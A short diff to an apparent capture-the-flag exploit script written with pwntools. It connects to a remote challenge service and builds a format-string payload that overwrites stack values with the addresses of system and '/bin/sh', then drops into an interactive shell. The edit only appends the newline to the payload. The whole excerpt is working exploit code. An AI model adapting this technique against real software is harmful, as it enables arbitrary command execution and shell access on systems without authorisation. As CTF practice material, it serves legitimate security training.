@@ -38,11 +38,11 @@ with remote('ctfq.u1tramarine.blue', 10023) as p:
     writes = { stack_addr : system_addr, stack_addr+0x4 : 0x0, stack_addr+0x8 : bin_sh} 
 
     payload = fmtstr_payload(7, writes, numbwritten=0, write_size='short')
+    payload += b'\n'
     p.recvuntil(b'?\n')
 
     print('[*] payload : [{}]\n'.format(payload))
     p.send(payload)
-    p.send(b'\n')
     p.interactive()
     
 # End of connection
